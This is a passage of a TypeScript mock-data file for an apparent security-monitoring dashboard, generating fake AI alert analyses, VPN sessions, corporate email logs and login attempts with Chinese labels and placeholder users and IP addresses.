    `${pick(['AI分析确认','关联分析发现','行为分析表明'])}${alert.title}，建议${pick(['立即处置','持续监控','升级处理'])}。`,
    `${pick(['自动化分析完成','关联分析完成','行为基线分析完成'])}，${pick(['确认告警有效','告警需人工确认','可能为误报'])}。`,
  ]
  const chainActions: Record<string, string[]> = {
    phishing: ['钓鱼邮件投递','用户交互','凭证窃取','横向移动'],
    brute_force: ['扫描探测','字典攻击','撞库尝试','账户失陷'],
    vpn_anomaly: ['凭证泄露','异地登录','异常访问','横向移动'],
    malware: ['初始植入','C2通信','权限提升','权限提升','横向扩散'],
    c2_communication: ['C2通信建立','Beacon心跳','指令执行','数据回传'],
    lateral_movement: ['凭证窃取','PTH认证','远程执行','权限维持'],
    data_exfiltration: ['数据收集','压缩打包','加密传输','外泄至C2'],
    privilege_escalation: ['漏洞探测','漏洞利用','权限获取','权限维持'],
  }
  const attackChain = (chainActions[alert.type] || ['初始入侵','横向移动','数据窃取']).map(s => `${pick(['疑似','可能','确认'])}${s}`)
  const recommendations = [
    pick(['立即隔离受影响资产','封锁来源IP','重置相关账户凭证','启用应急响应流程']),
    pick(['加强监控规则','更新安全策略','升级防护措施','通知相关责任人']),
    pick(['联系用户确认','审查访问日志','执行安全扫描','评估影响范围']),
  ]
  return {
    id: `AI${String(index + 22).padStart(3, '0')}`,
    alertId: alert.id,
    conclusion: pick(conclusions),
    riskScore: score,
    riskLevel: riskLevel as 'critical' | 'high' | 'medium' | 'low',
    attackChain,
    recommendations,
    relatedEvents: alert.relatedAlerts || [],
    userContext: `${alert.userName}为${pick(DEPARTMENTS)}${pick(['员工','经理','工程师','管理员'])}, ${pick(['拥有高权限访问','负责核心业务','日常操作用户'])}`,
    timestamp: alert.timestamp,
    agentType: aiAgent,
  }
}

function generateAIAnalyses(alerts: Alert[], count: number): AIAnalysis[] {
  const result: AIAnalysis[] = []
  const shuffled = [...alerts].sort(() => Math.random() - 0.5)
  for (let i = 0; i < count && i < shuffled.length; i++) {
    result.push(generateAIAnalysis(i, shuffled[i]))
  }
  return result
}

export const mockAIAnalyses: AIAnalysis[] = [...staticAIAnalyses, ...generateAIAnalyses(mockAlerts, 180)]

/* ========= VPN Sessions ========= */

const staticVPNSessions: VPNSession[] = [
  { id: 'VPN001', userName: '张伟', userId: 'U001', country: '中国', sourceIp: '223.104.18.42', destinationIp: '10.0.0.1', location: '北京', connectTime: '2026-05-18T08:30:00Z', disconnectTime: '', duration: 0, dataTransferred: 0, isAnomaly: false, status: 'active', deviceType: 'Windows 11 - Chrome' },
  { id: 'VPN002', userName: '李娜', userId: 'U002', country: '中国', sourceIp: '114.92.45.78', destinationIp: '10.0.0.1', location: '上海', connectTime: '2026-05-18T08:45:00Z', disconnectTime: '', duration: 0, dataTransferred: 0, isAnomaly: false, status: 'active', deviceType: 'MacBook Pro - Safari' },
  { id: 'VPN003', userName: '王芳', userId: 'U003', country: '中国', sourceIp: '61.148.203.35', destinationIp: '10.0.0.1', location: '北京', connectTime: '2026-05-18T09:00:00Z', disconnectTime: '', duration: 0, dataTransferred: 0, isAnomaly: false, status: 'active', deviceType: 'iPhone - Safari' },
  { id: 'VPN004', userName: '陈刚', userId: 'U004', country: '中国', sourceIp: '218.75.100.50', destinationIp: '10.0.0.1', location: '杭州', connectTime: '2026-05-18T08:15:00Z', disconnectTime: '', duration: 0, dataTransferred: 0, isAnomaly: false, status: 'active', deviceType: 'MacBook Pro - Chrome' },
  { id: 'VPN005', userName: '刘洋', userId: 'U005', country: '中国', sourceIp: '183.6.112.88', destinationIp: '10.0.0.1', location: '广州', connectTime: '2026-05-17T22:00:00Z', disconnectTime: '2026-05-18T07:30:00Z', duration: 570, dataTransferred: 2147483648, isAnomaly: false, status: 'completed', deviceType: 'Windows 10 - Chrome' },
  { id: 'VPN006', userName: '赵敏', userId: 'U006', country: '中国', sourceIp: '202.96.128.66', destinationIp: '10.0.0.1', location: '深圳', connectTime: '2026-05-18T07:30:00Z', disconnectTime: '', duration: 0, dataTransferred: 0, isAnomaly: false, status: 'active', deviceType: 'Windows 11 - Chrome' },
  { id: 'VPN007', userName: '孙浩', userId: 'U007', country: '中国', sourceIp: '210.22.88.99', destinationIp: '10.0.0.1', location: '成都', connectTime: '2026-05-18T06:00:00Z', disconnectTime: '', duration: 0, dataTransferred: 0, isAnomaly: false, status: 'active', deviceType: 'Linux - Firefox' },
  { id: 'VPN008', userName: '周静', userId: 'U008', country: '中国', sourceIp: '180.168.45.67', destinationIp: '10.0.0.1', location: '上海', connectTime: '2026-05-17T18:30:00Z', disconnectTime: '2026-05-18T01:00:00Z', duration: 390, dataTransferred: 1073741824, isAnomaly: false, status: 'completed', deviceType: 'iPhone - Safari' },
  { id: 'VPN009', userName: '吴强', userId: 'U009', country: '中国', sourceIp: '115.210.55.33', destinationIp: '10.0.0.1', location: '南京', connectTime: '2026-05-18T09:15:00Z', disconnectTime: '', duration: 0, dataTransferred: 0, isAnomaly: false, status: 'active', deviceType: 'Windows 11 - Edge' },
  { id: 'VPN010', userName: '郑丽', userId: 'U010', country: '中国', sourceIp: '101.231.78.44', destinationIp: '10.0.0.1', location: '上海', connectTime: '2026-05-18T08:30:00Z', disconnectTime: '', duration: 0, dataTransferred: 0, isAnomaly: false, status: 'active', deviceType: 'MacBook Air - Safari' },
  { id: 'VPN011', userName: '冯涛', userId: 'U011', country: '中国', sourceIp: '125.120.200.88', destinationIp: '10.0.0.1', location: '杭州', connectTime: '2026-05-17T20:00:00Z', disconnectTime: '2026-05-18T08:00:00Z', duration: 720, dataTransferred: 5368709120, isAnomaly: false, status: 'completed', deviceType: 'Windows 10 - Chrome' },
  { id: 'VPN012', userName: '褚琳', userId: 'U012', country: '中国', sourceIp: '60.12.34.56', destinationIp: '10.0.0.1', location: '北京', connectTime: '2026-05-18T08:00:00Z', disconnectTime: '', duration: 0, dataTransferred: 0, isAnomaly: false, status: 'active', deviceType: 'Android - Chrome' },
  { id: 'VPN013', userName: '卫东', userId: 'U013', country: '中国', sourceIp: '113.87.65.43', destinationIp: '10.0.0.1', location: '北京', connectTime: '2026-05-18T07:00:00Z', disconnectTime: '', duration: 0, dataTransferred: 0, isAnomaly: false, status: 'active', deviceType: 'MacBook Pro - Chrome' },
  { id: 'VPN014', userName: '蒋华', userId: 'U014', country: '中国', sourceIp: '122.224.100.22', destinationIp: '10.0.0.1', location: '上海', connectTime: '2026-05-18T09:00:00Z', disconnectTime: '', duration: 0, dataTransferred: 0, isAnomaly: false, status: 'active', deviceType: 'Windows Server 2022 - RDP' },
  { id: 'VPN015', userName: '沈雪', userId: 'U015', country: '中国', sourceIp: '36.110.88.77', destinationIp: '10.0.0.1', location: '北京', connectTime: '2026-05-17T14:00:00Z', disconnectTime: '2026-05-17T18:30:00Z', duration: 270, dataTransferred: 536870912, isAnomaly: false, status: 'completed', deviceType: 'iPhone - Safari' },
  { id: 'VPN016', userName: '韩超', userId: 'U016', country: '中国', sourceIp: '211.102.45.66', destinationIp: '10.0.0.1', location: '深圳', connectTime: '2026-05-18T09:30:00Z', disconnectTime: '', duration: 0, dataTransferred: 0, isAnomaly: false, status: 'active', deviceType: 'MacBook Pro - Safari' },
  { id: 'VPN017', userName: '杨帆', userId: 'U017', country: '中国', sourceIp: '222.73.55.88', destinationIp: '10.0.0.1', location: '上海', connectTime: '2026-05-18T08:00:00Z', disconnectTime: '', duration: 0, dataTransferred: 0, isAnomaly: false, status: 'active', deviceType: 'Windows 11 - Chrome' },
  { id: 'VPN018', userName: '朱婷', userId: 'U018', country: '中国', sourceIp: '116.228.77.99', destinationIp: '10.0.0.1', location: '上海', connectTime: '2026-05-17T19:00:00Z', disconnectTime: '2026-05-17T23:00:00Z', duration: 240, dataTransferred: 268435456, isAnomaly: false, status: 'completed', deviceType: 'Android - Chrome' },
  { id: 'VPN019', userName: '秦明', userId: 'U019', country: '中国', sourceIp: '124.160.88.11', destinationIp: '10.0.0.1', location: '杭州', connectTime: '2026-05-18T06:30:00Z', disconnectTime: '', duration: 0, dataTransferred: 0, isAnomaly: false, status: 'active', deviceType: 'Windows 10 - Edge' },
  { id: 'VPN020', userName: '许佳', userId: 'U020', country: '中国', sourceIp: '218.242.33.44', destinationIp: '10.0.0.1', location: '北京', connectTime: '2026-05-18T09:15:00Z', disconnectTime: '', duration: 0, dataTransferred: 0, isAnomaly: false, status: 'active', deviceType: 'MacBook Air - Safari' },
  { id: 'VPN021', userName: '吕峰', userId: 'U021', country: '中国', sourceIp: '61.152.100.55', destinationIp: '10.0.0.1', location: '上海', connectTime: '2026-05-18T07:00:00Z', disconnectTime: '2026-05-18T09:00:00Z', duration: 120, dataTransferred: 2147483648, isAnomaly: false, status: 'completed', deviceType: 'Windows 11 - Chrome' },
  { id: 'VPN022', userName: '施蕾', userId: 'U022', country: '中国', sourceIp: '58.34.66.77', destinationIp: '10.0.0.1', location: '成都', connectTime: '2026-05-18T08:45:00Z', disconnectTime: '', duration: 0, dataTransferred: 0, isAnomaly: false, status: 'active', deviceType: 'iPhone - Safari' },
  { id: 'VPN023', userName: '张磊', userId: 'U023', country: '中国', sourceIp: '101.81.44.22', destinationIp: '10.0.0.1', location: '苏州', connectTime: '2026-05-17T21:00:00Z', disconnectTime: '2026-05-18T05:00:00Z', duration: 480, dataTransferred: 4294967296, isAnomaly: false, status: 'completed', deviceType: 'MacBook Pro - Chrome' },
  { id: 'VPN024', userName: '钱进', userId: 'U024', country: '中国', sourceIp: '123.125.33.66', destinationIp: '10.0.0.1', location: '北京', connectTime: '2026-05-18T08:00:00Z', disconnectTime: '', duration: 0, dataTransferred: 0, isAnomaly: false, status: 'active', deviceType: 'Linux - Firefox' },
  { id: 'VPN025', userName: '吴涛', userId: 'U025', country: '中国', sourceIp: '220.181.55.88', destinationIp: '10.0.0.1', location: '北京', connectTime: '2026-05-18T05:30:00Z', disconnectTime: '', duration: 0, dataTransferred: 0, isAnomaly: false, status: 'active', deviceType: 'Windows 10 - Chrome' },
  { id: 'VPN026', userName: '黄强', userId: 'U026', country: '中国', sourceIp: '124.127.88.99', destinationIp: '10.0.0.1', location: '深圳', connectTime: '2026-05-17T10:00:00Z', disconnectTime: '2026-05-17T19:00:00Z', duration: 540, dataTransferred: 1073741824, isAnomaly: false, status: 'completed', deviceType: 'iPhone - Safari' },
  { id: 'VPN027', userName: '赵磊', userId: 'U027', country: '中国', sourceIp: '221.219.44.55', destinationIp: '10.0.0.1', location: '北京', connectTime: '2026-05-18T09:00:00Z', disconnectTime: '', duration: 0, dataTransferred: 0, isAnomaly: false, status: 'active', deviceType: 'Windows 11 - Edge' },
  { id: 'VPN028', userName: '孙丽', userId: 'U028', country: '中国', sourceIp: '114.243.66.77', destinationIp: '10.0.0.1', location: '重庆', connectTime: '2026-05-18T08:30:00Z', disconnectTime: '', duration: 0, dataTransferred: 0, isAnomaly: false, status: 'active', deviceType: 'MacBook Air - Safari' },
  { id: 'VPN029', userName: '周敏', userId: 'U029', country: '中国', sourceIp: '61.135.88.11', destinationIp: '10.0.0.1', location: '北京', connectTime: '2026-05-17T16:00:00Z', disconnectTime: '2026-05-17T20:00:00Z', duration: 240, dataTransferred: 134217728, isAnomaly: false, status: 'completed', deviceType: 'Android - Chrome' },
  { id: 'VPN030', userName: '林峰', userId: 'U030', country: '中国', sourceIp: '218.108.55.66', destinationIp: '10.0.0.1', location: '杭州', connectTime: '2026-05-18T07:45:00Z', disconnectTime: '', duration: 0, dataTransferred: 0, isAnomaly: false, status: 'active', deviceType: 'MacBook Pro - Chrome' },
  { id: 'VPN031', userName: '何欣', userId: 'U031', country: '中国', sourceIp: '124.42.33.44', destinationIp: '10.0.0.1', location: '广州', connectTime: '2026-05-18T09:30:00Z', disconnectTime: '', duration: 0, dataTransferred: 0, isAnomaly: false, status: 'active', deviceType: 'iPhone - Safari' },
  { id: 'VPN032', userName: '马骏', userId: 'U032', country: '中国', sourceIp: '222.35.77.88', destinationIp: '10.0.0.1', location: '北京', connectTime: '2026-05-18T06:00:00Z', disconnectTime: '', duration: 0, dataTransferred: 0, isAnomaly: false, status: 'active', deviceType: 'Windows 10 - Chrome' },
]

function generateVPNSession(index: number): VPNSession {
  const userEntry = pick(DEPT_USERS)
  const loc = pick(ALL_LOCATIONS)
  const device = pick(USER_AGENTS)
  const startDate = randomDate(30, 0)
  const durationMin = randInt(10, 720)
  const endDate = new Date(startDate.getTime() + durationMin * 60000)
  const isActive = Math.random() > 0.6
  const sessionStatus = isActive ? 'active' : pick(['completed', 'completed', 'completed', 'disconnected'] as const)
  return {
    id: `VPN${String(index + 33).padStart(3, '0')}`,
    userName: userEntry.userName,
    userId: userEntry.userId,
    sourceIp: generateIP(pick([...PUBLIC_IPS.slice(0, 5), ...INTERNAL_IPS.slice(0, 3)])),
    destinationIp: '10.0.0.1',
    location: loc,
    country: '中国',
    connectTime: formatISO(startDate),
    disconnectTime: isActive ? undefined : formatISO(endDate),
    duration: isActive ? 0 : durationMin,
    dataTransferred: isActive ? 0 : randInt(100, 10000) * 1048576,
    isAnomaly: !isActive && Math.random() > 0.7,
    anomalyReason: !isActive && Math.random() > 0.7 ? '异常时间段登录' : undefined,
    status: sessionStatus,
    deviceType: device,
  }
}

function generateVPNSessions(count: number): VPNSession[] {
  const result: VPNSession[] = []
  for (let i = 0; i < count; i++) result.push(generateVPNSession(i))
  return result
}

export const mockVPNSessions: VPNSession[] = [...staticVPNSessions, ...generateVPNSessions(170)]

/* ========= Email Logs ========= */

const staticEmailLogs: EmailLog[] = [
  { id: 'EML001', sender: 'zhangwei@secmind.com', recipient: 'client@partner.com', subject: '项目方案V3讨论', body: '关于下周的项目方案，附件为更新版本...', attachments: [], hasAttachment: false, status: 'sent', timestamp: '2026-05-18T09:30:00Z', size: 2.5, sourceIp: '10.0.2.50', userId: 'U001', userName: '张伟' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML002', sender: 'lina@secmind.com', recipient: 'supplier@vendor.com', subject: 'Q2付款申请审批', body: '财务部Q2供应商付款申请已审批，请查收附件...', attachments: ['付款审批单.pdf'], hasAttachment: true, attachmentName: '付款审批单.pdf', status: 'sent', timestamp: '2026-05-18T09:15:00Z', size: 3.8, sourceIp: '10.0.1.35', userId: 'U002', userName: '李娜' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML003', sender: 'wangfang@secmind.com', recipient: 'all@secmind.com', subject: '关于五一假期调休安排', body: '各位同事，五一假期调休安排已发布...', attachments: ['调休安排.pdf'], hasAttachment: true, attachmentName: '调休安排.pdf', status: 'sent', timestamp: '2026-05-17T16:00:00Z', size: 1.2, sourceIp: '10.0.1.50', userId: 'U003', userName: '王芳' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML004', sender: 'chengang@secmind.com', recipient: 'dev-team@secmind.com', subject: '代码评审通知 - 安全组件', body: '请各位对安全组件V2.1进行代码评审...', attachments: [], hasAttachment: false, status: 'sent', timestamp: '2026-05-18T10:00:00Z', size: 0.5, sourceIp: '10.0.2.100', userId: 'U004', userName: '陈刚' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML005', sender: 'liuyang@secmind.com', recipient: 'client@partner.com', subject: 'Q2市场推广方案', body: '关于Q2市场推广合作的初步方案...', attachments: ['Q2市场方案.pptx'], hasAttachment: true, attachmentName: 'Q2市场方案.pptx', status: 'sent', timestamp: '2026-05-17T15:30:00Z', size: 8.5, sourceIp: '10.0.3.20', userId: 'U005', userName: '刘洋' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML006', sender: 'zhaomin@secmind.com', recipient: 'security@secmind.com', subject: '安全事件报告 - 0522', body: '安全事件处理报告，包含Cobalt Strike攻击链分析...', attachments: ['安全事件报告0522.pdf'], hasAttachment: true, attachmentName: '安全事件报告0522.pdf', status: 'sent', timestamp: '2026-05-18T08:00:00Z', size: 4.5, sourceIp: '10.0.5.10', userId: 'U006', userName: '赵敏' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML007', sender: 'sunhao@secmind.com', recipient: 'ops-team@secmind.com', subject: '服务器维护通知 - 本周日', body: '本周日凌晨2-6点进行服务器维护...', attachments: [], hasAttachment: false, status: 'sent', timestamp: '2026-05-18T08:30:00Z', size: 0.3, sourceIp: '10.0.4.10', userId: 'U007', userName: '孙浩' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML008', sender: 'zhoujing@secmind.com', recipient: 'pm-team@secmind.com', subject: '产品需求评审V3.2', body: '产品需求文档V3.2版本已更新，请各位评审...', attachments: ['PRD_V3.2.pdf'], hasAttachment: true, attachmentName: 'PRD_V3.2.pdf', status: 'sent', timestamp: '2026-05-18T09:00:00Z', size: 6.2, sourceIp: '10.0.3.30', userId: 'U008', userName: '周静' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML009', sender: 'wuqiang@secmind.com', recipient: 'dev-team@secmind.com', subject: 'API接口文档更新', body: 'API接口文档已更新至v2.8版本...', attachments: ['API文档_v2.8.pdf'], hasAttachment: true, attachmentName: 'API文档_v2.8.pdf', status: 'sent', timestamp: '2026-05-17T17:00:00Z', size: 3.2, sourceIp: '10.0.2.60', userId: 'U009', userName: '吴强' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML010', sender: 'zhengli@secmind.com', recipient: 'audit@secmind.com', subject: 'Q1财务审计报告', body: 'Q1财务审计报告已完成，请查收...', attachments: ['Q1审计报告.xlsx'], hasAttachment: true, attachmentName: 'Q1审计报告.xlsx', status: 'sent', timestamp: '2026-05-18T07:45:00Z', size: 2.8, sourceIp: '10.0.1.35', userId: 'U010', userName: '郑丽' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML011', sender: 'fengtao@secmind.com', recipient: 'hr@secmind.com', subject: '请假申请 - 5月20日', body: '申请5月20日请假一天，处理个人事务...', attachments: [], hasAttachment: false, status: 'sent', timestamp: '2026-05-17T10:00:00Z', size: 0.1, sourceIp: '10.0.2.60', userId: 'U011', userName: '冯涛' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML012', sender: 'chulin@secmind.com', recipient: 'wangfang@secmind.com', subject: '招聘进展汇报', body: '本月招聘进展，技术岗位收到简历120份...', attachments: ['招聘进展.xlsx'], hasAttachment: true, attachmentName: '招聘进展.xlsx', status: 'sent', timestamp: '2026-05-18T09:30:00Z', size: 1.5, sourceIp: '10.0.1.50', userId: 'U012', userName: '褚琳' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML013', sender: 'weidong@secmind.com', recipient: 'security@secmind.com', subject: '渗透测试报告 - 0522', body: '本周渗透测试发现5个高危漏洞...', attachments: ['渗透测试报告0522.pdf'], hasAttachment: true, attachmentName: '渗透测试报告0522.pdf', status: 'sent', timestamp: '2026-05-18T10:30:00Z', size: 5.0, sourceIp: '10.0.5.10', userId: 'U013', userName: '卫东' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML014', sender: 'jianghua@secmind.com', recipient: 'dba@secmind.com', subject: '数据库性能优化方案', body: 'MySQL数据库性能优化方案已整理...', attachments: ['数据库优化方案.pdf'], hasAttachment: true, attachmentName: '数据库优化方案.pdf', status: 'sent', timestamp: '2026-05-17T14:30:00Z', size: 4.2, sourceIp: '10.0.4.15', userId: 'U014', userName: '蒋华' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML015', sender: 'shenxue@secmind.com', recipient: 'client@partner.com', subject: '品牌推广方案确认', body: '关于Q2品牌推广合作方案，请确认...', attachments: ['品牌推广方案.pptx'], hasAttachment: true, attachmentName: '品牌推广方案.pptx', status: 'sent', timestamp: '2026-05-18T11:00:00Z', size: 7.8, sourceIp: '10.0.3.20', userId: 'U015', userName: '沈雪' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML016', sender: 'hanchao@secmind.com', recipient: 'dev-team@secmind.com', subject: '系统架构评审通知', body: '下周三系统架构评审会议通知...', attachments: [], hasAttachment: false, status: 'sent', timestamp: '2026-05-18T10:15:00Z', size: 0.4, sourceIp: '10.0.2.80', userId: 'U016', userName: '韩超' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML017', sender: 'yangfan@secmind.com', recipient: 'tech@secmind.com', subject: '技术选型方案讨论', body: '关于微服务架构技术选型的方案讨论...', attachments: ['技术选型方案.pdf'], hasAttachment: true, attachmentName: '技术选型方案.pdf', status: 'sent', timestamp: '2026-05-17T16:00:00Z', size: 3.6, sourceIp: '10.0.2.50', userId: 'U017', userName: '杨帆' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML018', sender: 'zhuting@secmind.com', recipient: 'supplier@vendor.com', subject: '发票核对通知', body: 'Q2发票核对清单请查收确认...', attachments: ['发票核对.xlsx'], hasAttachment: true, attachmentName: '发票核对.xlsx', status: 'delivered', timestamp: '2026-05-18T09:00:00Z', size: 1.8, sourceIp: '10.0.1.35', userId: 'U018', userName: '朱婷' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML019', sender: 'qinming@secmind.com', recipient: 'security@secmind.com', subject: '漏洞扫描报告 - 0522', body: '本期漏洞扫描报告，共发现12个中高危漏洞...', attachments: ['漏洞扫描报告0522.pdf'], hasAttachment: true, attachmentName: '漏洞扫描报告0522.pdf', status: 'sent', timestamp: '2026-05-18T08:00:00Z', size: 4.8, sourceIp: '10.0.5.10', userId: 'U019', userName: '秦明' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML020', sender: 'xujia@secmind.com', recipient: 'pm-team@secmind.com', subject: '产品路线图更新', body: '产品路线图Q2-Q3规划已更新...', attachments: ['产品路线图.pdf'], hasAttachment: true, attachmentName: '产品路线图.pdf', status: 'sent', timestamp: '2026-05-18T09:30:00Z', size: 5.2, sourceIp: '10.0.3.30', userId: 'U020', userName: '许佳' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML021', sender: 'lvfeng@secmind.com', recipient: 'ops-team@secmind.com', subject: '运维变更通知', body: '本周计划进行4次运维变更操作...', attachments: ['变更计划.xlsx'], hasAttachment: true, attachmentName: '变更计划.xlsx', status: 'sent', timestamp: '2026-05-18T07:30:00Z', size: 1.0, sourceIp: '10.0.4.10', userId: 'U021', userName: '吕峰' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML022', sender: 'shilei@secmind.com', recipient: 'hr@secmind.com', subject: '培训计划确认', body: '6月份培训计划已确认，请查收...', attachments: ['培训计划.pdf'], hasAttachment: true, attachmentName: '培训计划.pdf', status: 'sent', timestamp: '2026-05-17T11:00:00Z', size: 2.0, sourceIp: '10.0.1.50', userId: 'U022', userName: '施蕾' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML023', sender: 'zhanglei@secmind.com', recipient: 'dev-team@secmind.com', subject: '代码规范更新通知', body: '代码规范V3.0版本已发布...', attachments: ['代码规范V3.0.pdf'], hasAttachment: true, attachmentName: '代码规范V3.0.pdf', status: 'sent', timestamp: '2026-05-18T10:00:00Z', size: 2.5, sourceIp: '10.0.2.60', userId: 'U023', userName: '张磊' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML024', sender: 'qianjin@secmind.com', recipient: 'security@secmind.com', subject: '安全策略更新建议', body: '针对近期安全事件的策略更新建议...', attachments: ['策略更新建议.pdf'], hasAttachment: true, attachmentName: '策略更新建议.pdf', status: 'sent', timestamp: '2026-05-18T09:00:00Z', size: 3.0, sourceIp: '10.0.5.10', userId: 'U024', userName: '钱进' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML025', sender: 'wutao@secmind.com', recipient: 'ops-team@secmind.com', subject: '服务器资源监控报告', body: '本周服务器资源监控报告，CPU和内存使用率...', attachments: ['资源监控报告.xlsx'], hasAttachment: true, attachmentName: '资源监控报告.xlsx', status: 'sent', timestamp: '2026-05-18T06:30:00Z', size: 1.8, sourceIp: '10.0.4.10', userId: 'U025', userName: '吴涛' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML026', sender: 'huangqiang@secmind.com', recipient: 'all@secmind.com', subject: 'CEO致辞 - 公司Q2战略', body: '各位同事，公司Q2战略部署已确定...', attachments: ['Q2战略部署.pdf'], hasAttachment: true, attachmentName: 'Q2战略部署.pdf', status: 'sent', timestamp: '2026-05-17T09:00:00Z', size: 6.5, sourceIp: '10.0.1.100', userId: 'U026', userName: '黄强' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML027', sender: 'zhaolei@secmind.com', recipient: 'tech@secmind.com', subject: '技术方案评审结果', body: '上周技术方案评审结果汇总...', attachments: ['评审结果.xlsx'], hasAttachment: true, attachmentName: '评审结果.xlsx', status: 'sent', timestamp: '2026-05-18T08:45:00Z', size: 1.2, sourceIp: '10.0.2.50', userId: 'U027', userName: '赵磊' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML028', sender: 'sunli@secmind.com', recipient: 'finance@secmind.com', subject: '报销单据审核', body: '4月份报销单据审核清单...', attachments: ['报销审核.xlsx'], hasAttachment: true, attachmentName: '报销审核.xlsx', status: 'delivered', timestamp: '2026-05-18T09:15:00Z', size: 1.5, sourceIp: '10.0.1.35', userId: 'U028', userName: '孙丽' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML029', sender: 'zhoumin@secmind.com', recipient: 'wangfang@secmind.com', subject: '员工满意度调查结果', body: 'Q1员工满意度调查结果汇总...', attachments: ['满意度调查.pdf'], hasAttachment: true, attachmentName: '满意度调查.pdf', status: 'sent', timestamp: '2026-05-17T16:30:00Z', size: 4.0, sourceIp: '10.0.1.50', userId: 'U029', userName: '周敏' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML030', sender: 'linfeng@secmind.com', recipient: 'dev-team@secmind.com', subject: 'CI/CD流水线更新', body: 'CI/CD流水线已更新至v3.2版本...', attachments: [], hasAttachment: false, status: 'sent', timestamp: '2026-05-18T10:30:00Z', size: 0.2, sourceIp: '10.0.2.88', userId: 'U030', userName: '林峰' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML031', sender: 'hexin@secmind.com', recipient: 'client@partner.com', subject: '市场活动策划方案', body: '6月份市场活动策划方案初稿...', attachments: ['市场活动方案.pptx'], hasAttachment: true, attachmentName: '市场活动方案.pptx', status: 'sent', timestamp: '2026-05-18T11:30:00Z', size: 9.0, sourceIp: '10.0.3.20', userId: 'U031', userName: '何欣' , urls: [], isPhishing: false, spamScore: 15 },
  { id: 'EML032', sender: 'majun@secmind.com', recipient: 'security@secmind.com', subject: '安全设备巡检报告', body: '本周安全设备巡检完成，所有设备正常运行...', attachments: ['设备巡检报告.pdf'], hasAttachment: true, attachmentName: '设备巡检报告.pdf', status: 'sent', timestamp: '2026-05-18T07:00:00Z', size: 2.0, sourceIp: '10.0.5.10', userId: 'U032', userName: '马骏' , urls: [], isPhishing: false, spamScore: 15 },
]

function generateEmailLog(index: number): EmailLog {
  const userEntry = pick(DEPT_USERS)
  const isExternal = Math.random() > 0.5
  const domains = ['partner.com', 'vendor.com', 'client.com', 'gmail.com', 'qq.com', '163.com']
  const recipients = isExternal ? `${pick(['contact', 'info', 'service', 'support', 'sales'])}@${pick(domains)}` : `${pick(['all', 'team', 'dev-team', 'ops-team', 'security'])}@secmind.com`
  const subjects = [
    '项目进度汇报', '需求变更申请', 'Bug修复通知', '版本发布通知',
    '会议纪要', '周报提交', '审批流程通知', '合同确认',
    '技术方案讨论', '数据统计报表', '安全公告', '系统通知',
  ]
  const hasAttachment = Math.random() > 0.5
  const attachNames = ['报告.pdf', '方案.pptx', '数据.xlsx', '文档.docx', '设计稿.sketch']
  return {
    id: `EML${String(index + 33).padStart(3, '0')}`,
    sender: `${userEntry.userName}@secmind.com`,
    recipient: recipients,
    subject: pick(subjects),
    body: `${pick(['关于','回复','转发','转发'])}${pick(subjects)}${pick(['，请查收','，请审批','，请确认',''])}...`,
    attachments: hasAttachment ? [pick(attachNames)] : [],
    hasAttachment,
    urls: [],
    isPhishing: Math.random() > 0.9,
    spamScore: Math.floor(Math.random() * 100),
    status: pick(['sent', 'sent', 'sent', 'delivered', 'failed'] as const),
    timestamp: formatISO(randomDate(30, 0)),
    size: parseFloat((Math.random() * 10).toFixed(1)),
    sourceIp: generateIP(pick(INTERNAL_IPS)),
    userId: userEntry.userId,
    userName: userEntry.userName,
  }
}

function generateEmailLogs(count: number): EmailLog[] {
  const result: EmailLog[] = []
  for (let i = 0; i < count; i++) result.push(generateEmailLog(i))
  return result
}

export const mockEmailLogs: EmailLog[] = [...staticEmailLogs, ...generateEmailLogs(120)]

/* ========= Login Attempts ========= */

const staticLoginAttempts: LoginAttempt[] = [
  { id: 'LA001', userName: '张伟', userId: 'U001', sourceIp: '223.104.18.42', country: '中国', city: '北京', timestamp: '2026-05-18T08:30:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'Windows 11 - Chrome', failureReason: '' },
  { id: 'LA002', userName: '李娜', userId: 'U002', sourceIp: '114.92.45.78', country: '中国', city: '上海', timestamp: '2026-05-18T08:45:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'MacBook Pro - Safari', failureReason: '' },
  { id: 'LA003', userName: '王芳', userId: 'U003', sourceIp: '61.148.203.35', country: '中国', city: '北京', timestamp: '2026-05-18T09:00:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'iPhone - Safari', failureReason: '' },
  { id: 'LA004', userName: '陈刚', userId: 'U004', sourceIp: '218.75.100.50', country: '中国', city: '杭州', timestamp: '2026-05-18T08:15:00Z', status: 'success', success: true, authMethod: '密码+MFA', userAgent:  'MacBook Pro - Chrome', failureReason: '' },
